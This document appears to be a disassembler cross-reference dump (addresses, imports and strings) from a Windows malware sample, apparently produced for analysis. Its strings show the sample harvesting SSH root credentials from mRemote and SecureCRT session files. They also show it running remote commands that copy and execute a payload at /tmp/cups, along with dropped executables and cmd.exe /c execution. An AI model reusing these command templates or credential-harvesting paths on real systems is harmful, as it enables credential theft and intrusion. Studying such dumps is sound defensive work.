reference_vaddr	symbol_addr	symbol_type	caller_function	data
0x4021ef	0x404741	string	0x402150	;\r<`A
0x402237	0x404741	string	0x402200	;\r<`A
0x402255	0x404741	string	0x402200	;\r<`A
0x402280	0x40f010	import	0x402200	KERNEL32.DLL.GetTempPathA
0x4022dd	0x404741	string	0x402200	;\r<`A
0x402336	0x40497a	string	0x402200	j\fhpQA
0x402351	0x404741	string	0x402200	;\r<`A
0x40239c	0x40f010	import	0x402360	KERNEL32.DLL.GetTempPathA
0x4023b8	0x414c78	string	0x402360	AgentBase.exe
0x4023d9	0x414c88	string	0x402360	c:\windows\temp\~v3.log
0x4023e2	0x40f154	import	0x402360	SHLWAPI.dll.PathFileExistsA
0x4023f4	0x40f014	import	0x402360	KERNEL32.DLL.WinExec
0x4023ff	0x404741	string	0x402360	;\r<`A
0x40246a	0x40f008	import	0x402410	KERNEL32.DLL.LoadLibraryA
0x402470	0x40f00c	import	0x402410	KERNEL32.DLL.GetProcAddress
0x402478	0x414c30	string	0x402410	FindResourceA
0x402480	0x414c40	string	0x402410	LoadResource
0x40248d	0x414c50	string	0x402410	LockResource
0x40249a	0x414c60	string	0x402410	SizeofResource
0x4024c8	0x414ca4	string	0x402410	alg.exe
0x4024f9	0x414cac	string	0x402410	conime.exe
0x40252a	0x414cb8	string	0x402410	~pr1.tmp
0x40255b	0x414c78	string	0x402410	AgentBase.exe
0x402575	0x40f018	import	0x402410	KERNEL32.DLL.GetVersion
0x40258f	0x40f01c	import	0x402410	KERNEL32.DLL.GetWindowsDirectoryA
0x40259a	0x414cc4	string	0x402410	:\Documents and settings\*.*
0x4025a9	0x414ce4	string	0x402410	:\Users\*.*
0x4025cb	0x40f020	import	0x402410	KERNEL32.DLL.FindFirstFileA
0x4025de	0x40f154	import	0x402410	SHLWAPI.dll.PathFileExistsA
0x4026c1	0x414cf4	string	0x402410	All Users
0x4026db	0x414d00	string	0x402410	Default
0x4026f5	0x414d08	string	0x402410	Public
0x402798	0x414d18	string	0x402410	%sLocal Settings\Application Data\Felix_Deimel\mRemote\confCons.xml
0x4027ae	0x414d5c	string	0x402410	%sApplication Data\VanDyke\Config\Sessions
0x4027b5	0x414d88	string	0x402410	%sAppData\Local\Felix_Deimel\mRemote\confCons.xml
0x4027cb	0x414dbc	string	0x402410	%sAppData\Roaming\VanDyke\Config\Sessions
0x40281e	0x40f024	import	0x402410	KERNEL32.DLL.FindNextFileA
0x40282d	0x40f028	import	0x402410	KERNEL32.DLL.FindClose
0x402841	0x404741	string	0x402410	;\r<`A
0x402ae5	0x404741	string	0x402a20	;\r<`A
0x403196	0x404741	string	0x402af0	;\r<`A
0x40323b	0x404741	string	0x4031e0	;\r<`A
0x403244	0x414de8	string	0x4031e0	mR3m
0x4032c8	0x404741	string	0x4031e0	;\r<`A
0x40331a	0x414df0	string	0x4032e0	%s="
0x403360	0x404d00	string	0x4032e0	3\nD$\bS
0x40336f	0x404d00	string	0x4032e0	3\nD$\bS
0x403392	0x404741	string	0x4032e0	;\r<`A
0x403402	0x40f02c	import	0x4033a0	KERNEL32.DLL.CreateThread
0x403440	0x414dfc	string	0x4033a0	<Node
0x40345c	0x414e04	string	0x4033a0	Username="root"
0x403478	0x414e14	string	0x4033a0	Protocol="SSH
0x403494	0x414e24	string	0x4033a0	Password=""
0x403552	0x414e34	string	0x4033a0	Hostname
0x403568	0x414e40	string	0x4033a0	Descr
0x40357e	0x414e48	string	0x4033a0	Panel
0x403594	0x414e50	string	0x4033a0	Port
0x4035aa	0x414e58	string	0x4033a0	Password
0x403608	0x414e64	string	0x4033a0	root
0x403650	0x40f030	import	0x4033a0	KERNEL32.DLL.Sleep
0x403671	0x404741	string	0x4033a0	;\r<`A
0x4036da	0x404741	string	0x403680	;\r<`A
0x403705	0x404741	string	0x403680	;\r<`A
0x40373c	0x40497a	string	0x403680	j\fhpQA
0x403776	0x40f034	import	0x403680	KERNEL32.DLL.MoveFileExA
0x403788	0x404741	string	0x403680	;\r<`A
0x40384c	0x40f038	import	0x4037a0	KERNEL32.DLL.CreatePipe
0x4038b9	0x40f03c	import	0x4037a0	KERNEL32.DLL.GetSystemDirectoryA
0x4038cd	0x414e74	string	0x4037a0	%s\cmd.exe /c %s
0x4038f9	0x40f040	import	0x4037a0	KERNEL32.DLL.CreateProcessA
0x403905	0x40f044	import	0x4037a0	KERNEL32.DLL.CloseHandle
0x403913	0x40f030	import	0x4037a0	KERNEL32.DLL.Sleep
0x403934	0x40f048	import	0x4037a0	KERNEL32.DLL.ReadFile
0x403942	0x40f04c	import	0x4037a0	KERNEL32.DLL.TerminateProcess
0x40395c	0x414e88	string	0x4037a0	100%
0x403974	0x414e90	string	0x4037a0	denied
0x403992	0x404741	string	0x4037a0	;\r<`A
0x4039a7	0x404741	string	0x4037a0	;\r<`A
0x403a8e	0x40f010	import	0x4039b0	KERNEL32.DLL.GetTempPathA
0x403a94	0x414cac	string	0x4039b0	conime.exe
0x403aa5	0x414e98	string	0x4039b0	%s%s
0x403ab0	0x414ca4	string	0x4039b0	alg.exe
0x403ac1	0x414e98	string	0x4039b0	%s%s
0x403acc	0x414cb8	string	0x4039b0	~pr1.tmp
0x403add	0x414e98	string	0x4039b0	%s%s
0x403b0c	0x404741	string	0x4039b0	;\r<`A
0x403b42	0x414ea0	string	0x4039b0	%s -batch -P %s -l %s -pw %s %s %s:/tmp/cups
0x403b64	0x414ed0	string	0x4039b0	%s -batch -P %s -l %s -pw %s %s "chmod 755 /tmp/cups;/tmp/cups"
0x403ba7	0x404741	string	0x4039b0	;\r<`A
0x403bd8	0x40f02c	import	0x403bc0	KERNEL32.DLL.CreateThread
0x403be6	0x40f050	import	0x403bc0	KERNEL32.DLL.WaitForSingleObject
0x403bf1	0x40f054	import	0x403bc0	KERNEL32.DLL.GetExitCodeThread
0x403c04	0x40f058	import	0x403bc0	KERNEL32.DLL.TerminateThread
0x40435d	0x404741	string	0x403e40	;\r<`A
0x4043b0	0x414f10	string	0x404370	%s\*.ini
0x4043cc	0x40f020	import	0x404370	KERNEL32.DLL.FindFirstFileA
0x40450a	0x40540f	string	0x404370	j\fh@RA
0x404535	0x414f1c	string	0x404370	S:"Protocol Name"=SSH
0x404551	0x414f34	string	0x404370	S:"Username"=root
0x40456d	0x414f48	string	0x404370	D:"Session Password Saved"=00000001
0x404589	0x414f6c	string	0x404370	S:"Hostname"=
0x4045a7	0x404d00	string	0x404370	3\nD$\bS
0x4045c5	0x414f7c	string	0x404370	S:"Password"=
0x4045e3	0x404d00	string	0x404370	3\nD$\bS
0x404616	0x414f8c	string	0x404370	D:"[SSH2] Port"=
0x404634	0x404d00	string	0x404370	3\nD$\bS
0x4046b3	0x414e64	string	0x404370	root
0x4046f9	0x40f02c	import	0x404370	KERNEL32.DLL.CreateThread
0x404701	0x40f030	import	0x404370	KERNEL32.DLL.Sleep
0x404715	0x40f024	import	0x404370	KERNEL32.DLL.FindNextFileA
0x40472a	0x40f028	import	0x404370	KERNEL32.DLL.FindClose
0x404738	0x404741	string	0x404370	;\r<`A
0x404757	0x4061c0	string	0x404750	h b@
0x404819	0x404750	string	0x40480c	j\fhPQA
0x404981	0x4061c0	string	0x40497a	h b@
0x404a68	0x4061c0	string	0x404a61	h b@
0x404b89	0x404b98	string	0x404b60	^[_3
0x404c62	0x40f05c	import	0x404c1d	KERNEL32.DLL.HeapAlloc
0x404cc7	0x40f064	import	0x404cb1	KERNEL32.DLL.HeapFree
0x404cd9	0x40f060	import	0x404cb1	KERNEL32.DLL.GetLastError
0x404d6a	0x404d74	string	0x404d00	^_[3
0x404d83	0x404d74	string	0x404d00	^_[3
0x404d8b	0x404d74	string	0x404d00	^_[3
0x404d96	0x404d74	string	0x404d00	^_[3
0x404d9e	0x404d74	string	0x404d00	^_[3
0x404f13	0x4061c0	string	0x404f0c	h b@
0x405207	0x4061c0	string	0x405200	h b@
0x405416	0x4061c0	string	0x40540f	h b@
0x405798	0x4061c0	string	0x405768	h b@
0x4057a1	0x40f070	import	0x405768	KERNEL32.DLL.GetStartupInfoW
0x4057b6	0x40f06c	import	0x405768	KERNEL32.DLL.HeapSetInformation
0x405840	0x40f068	import	0x405768	KERNEL32.DLL.GetCommandLineA
0x405893	0x40589b	string	0x405768	j\nYQPVh
0x4059c3	0x40f080	import	0x40590a	KERNEL32.DLL.IsDebuggerPresent
0x4059d8	0x40f07c	import	0x40590a	KERNEL32.DLL.SetUnhandledExceptionFilter
0x4059e3	0x40f078	import	0x40590a	KERNEL32.DLL.UnhandledExceptionFilter
0x4059ff	0x40f074	import	0x40590a	KERNEL32.DLL.GetCurrentProcess
0x405a06	0x40f04c	import	0x40590a	KERNEL32.DLL.TerminateProcess
0x405a44	0x405a64	string	0x405a0e	3ҹH`A blocks=Basic Latin,Cyrillic
0x405a5d	0x405a64	string	0x405a0e	3ҹH`A blocks=Basic Latin,Cyrillic
0x405b1d	0x40f084	import	0x405ae5	KERNEL32.DLL.EnterCriticalSection
0x405b50	0x40f084	import	0x405b26	KERNEL32.DLL.EnterCriticalSection
0x405b8c	0x40f088	import	0x405b58	KERNEL32.DLL.LeaveCriticalSection
0x405bbb	0x40f088	import	0x405b94	KERNEL32.DLL.LeaveCriticalSection
0x405d9b	0x40f1e4	string	0x405bc3	UTF-8
0x405dba	0x40f1ec	string	0x405bc3	UTF-16LE
0x405dd9	0x40f1f8	string	0x405bc3	UNICODE
0x405e61	0x4061c0	string	0x405e5a	h b@
0x405eb1	0x40af5e	string	0x405e5a	j\fhXTA
0x405f16	0x40f08c	import	0x405e5a	KERNEL32.DLL.InitializeCriticalSectionAndSpinCount
0x405f3f	0x40f084	import	0x405e5a	KERNEL32.DLL.EnterCriticalSection
0x406086	0x40f080	import	0x405f9c	KERNEL32.DLL.IsDebuggerPresent
0x406090	0x40f07c	import	0x405f9c	KERNEL32.DLL.SetUnhandledExceptionFilter
0x40609d	0x40f078	import	0x405f9c	KERNEL32.DLL.UnhandledExceptionFilter
0x4060be	0x404741	string	0x405f9c	;\r<`A
0x4060db	0x40f074	import	0x4060c5	KERNEL32.DLL.GetCurrentProcess
0x4060e2	0x40f04c	import	0x4060c5	KERNEL32.DLL.TerminateProcess
0x4060f5	0x40f094	import	0x4060ea	KERNEL32.DLL.DecodePointer
0x406254	0x404741	string	0x406222	;\r<`A
0x406264	0x404741	string	0x406222	;\r<`A
0x4062a9	0x4064a2	string	0x406222	UVWS
0x4062d7	0x404741	string	0x406222	;\r<`A
0x4062e7	0x404741	string	0x406222	;\r<`A
0x40645b	0x404741	string	0x4063b0	;\r<`A
0x4064db	0x4064e6	string	0x4064d2	_^[]
0x406776	0x40f0a8	import	0x406666	KERNEL32.DLL.GetConsoleMode
0x406796	0x40f0a4	import	0x406666	KERNEL32.DLL.GetConsoleCP
0x406886	0x40f0a0	import	0x406666	KERNEL32.DLL.WideCharToMultiByte
0x4068af	0x40f09c	import	0x406666	KERNEL32.DLL.WriteFile
